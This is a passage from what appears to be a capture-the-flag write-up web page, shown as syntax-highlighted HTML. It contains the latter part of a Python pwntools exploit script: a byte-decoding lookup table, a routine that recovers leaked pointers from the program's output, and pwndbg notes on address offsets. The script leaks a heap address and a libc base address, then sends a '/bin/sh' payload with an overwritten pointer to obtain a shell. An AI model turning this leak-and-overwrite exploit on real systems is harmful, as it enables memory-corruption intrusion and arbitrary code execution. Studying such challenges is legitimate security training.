style="color:#ae81ff">0</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(word_29160)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>        word_29160[i] <span style="color:#f92672">=</span> u16(bytes(word_29160[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]))
</span></span><span style="display:flex;"><span>    word_29160 <span style="color:#f92672">=</span> word_29160[:len(word_29160)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(word_29780)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>        word_29780[i] <span style="color:#f92672">=</span> u16(bytes(word_29780[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]))
</span></span><span style="display:flex;"><span>    word_29780 <span style="color:#f92672">=</span> word_29780[:len(word_29780)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa0</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x5f</span>:
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> unk_29360[word_29780[x<span style="color:#f92672">-</span><span style="color:#ae81ff">0x80</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>]<span style="color:#f92672">+</span>i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            v<span style="color:#f92672">.</span>append(unk_29360[word_29780[x<span style="color:#f92672">-</span><span style="color:#ae81ff">0x80</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>]<span style="color:#f92672">+</span>i])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes(v)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> unk_29360[word_29160[x]<span style="color:#f92672">+</span>i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            v<span style="color:#f92672">.</span>append((unk_29360[word_29160[x]<span style="color:#f92672">+</span>i]))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes(v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_bytes</span>(raw_bytes : bytes, k : bytes, l : int) <span style="color:#f92672">-&gt;</span> bytes:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse</span>(res, raw,l,idx,candidates):
</span></span><span style="display:flex;"><span>        print(res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">&gt;</span> l:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> len(res) <span style="color:#f92672">==</span> l:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> bytes(res)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x20</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> raw[idx<span style="color:#f92672">+</span>len(res):idx<span style="color:#f92672">+</span>len(res)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> unctrl_sp_emu(i):
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>                    v <span style="color:#f92672">=</span> (parse(res,raw,l,idx<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,candidates))
</span></span><span style="display:flex;"><span>                    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> v <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                        candidates<span style="color:#f92672">.</span>append(v)
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>pop()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x7f</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> p8(raw[idx<span style="color:#f92672">+</span>len(res)]) <span style="color:#f92672">==</span> unctrl_sp_emu(i):
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>                    v <span style="color:#f92672">=</span> (parse(res,raw,l,idx,candidates))
</span></span><span style="display:flex;"><span>                    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> v <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                        candidates<span style="color:#f92672">.</span>append(v)
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>pop()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x7f</span>,<span style="color:#ae81ff">0xa0</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> raw[idx<span style="color:#f92672">+</span>len(res):idx<span style="color:#f92672">+</span>len(res)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> unctrl_sp_emu(i):
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>                    v <span style="color:#f92672">=</span> (parse(res,raw,l,idx<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,candidates))
</span></span><span style="display:flex;"><span>                    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> v <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                        candidates<span style="color:#f92672">.</span>append(v)
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>pop()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x100</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (raw[idx<span style="color:#f92672">+</span>len(res)]) <span style="color:#f92672">==</span> (i):
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>                    v <span style="color:#f92672">=</span> (parse(res,raw,l,idx,candidates))
</span></span><span style="display:flex;"><span>                    f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> v <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                        candidates<span style="color:#f92672">.</span>append(v)
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>pop()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> f<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    candidates <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> raw_bytes<span style="color:#f92672">.</span>index(k)
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    parse(res, raw_bytes, l, idx<span style="color:#f92672">+</span>len(k),candidates)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> candidates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwndbg&gt; source ./addrsearch.py</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># addr : 0x55ad1bc7f6c0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># target addr start: 0x7f12897b8000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># target addr end : 0x7f1289765000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f6c0 | 0x7f12897b9ce0 -- offset : -0xe720</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f6c8 | 0x7f12897b9cf0 -- offset : -0xe718</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f6d0 | 0x7f12897b9d00 -- offset : -0xe710</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f6e0 | 0x7f12897b9d20 -- offset : -0xe700</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f808 | 0x7f128978bb20 -- offset : -0xe5d8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f8f0 | 0x7f12897c4b50 -- offset : -0xe4f0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc7f8f8 | 0x7f12897b9d50 -- offset : -0xe4e8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc800f8 | 0x7f1289765680 -- offset : -0xdce8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc80168 | 0x7f12897615e0 -- offset : -0xdc78</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc80260 | 0x7f12897610a0 -- offset : -0xdb80</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc8e9b0 | 0x7f1289764cc0 -- offset : 0xbd0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
</span></span><span style="display:flex;"><span>        print(solve(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>    rvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result&#39;</span>)
</span></span><span style="display:flex;"><span>    s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> rvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1.&#39;</span>)
</span></span><span style="display:flex;"><span>    addr <span style="color:#f92672">=</span> leak_bytes(rv,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1.  &#39;</span>,<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>    heap <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> addr:
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> u64(i <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x55</span> <span style="color:#f92672">or</span>  (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x56</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> heap <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                heap <span style="color:#f92672">=</span> v
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span>(heap <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    success(<span style="color:#e6db74">&#34;heap : &#34;</span> <span style="color:#f92672">+</span> hex(heap))
</span></span><span style="display:flex;"><span>    s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
</span></span><span style="display:flex;"><span>        print(solve(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>),<span style="color:#e6db74">&#39;solved&#39;</span>)
</span></span><span style="display:flex;"><span>    rvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># constraint</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># addr-0x10+0x28 -&gt; 0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708</span>
</span></span><span style="display:flex;"><span>    s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(heap<span style="color:#f92672">-</span><span style="color:#ae81ff">0xe708</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>))
</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> rvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3.  &#39;</span>)
</span></span><span style="display:flex;"><span>    addr <span style="color:#f92672">=</span> (leak_bytes(rv,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3.  &#39;</span>,<span style="color:#ae81ff">6</span>))
</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> addr:
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> u64(i <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7f</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> libc_base <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                libc_base <span style="color:#f92672">=</span> v
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span>(libc_base <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x24bd10</span>
</span></span><span style="display:flex;"><span>    success(<span style="color:#e6db74">&#34;libc_base : &#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
</span></span><span style="display:flex;"><span>    s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
</span></span><span style="display:flex;"><span>        print(solve(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>),<span style="color:#e6db74">&#39;solved&#39;</span>)
</span></span><span style="display:flex;"><span>    rvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result&#39;</span>)
</span></span><span style="display:flex;"><span>    s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1f6080</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>))
</span></span><span style="display:flex;"><span>    s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
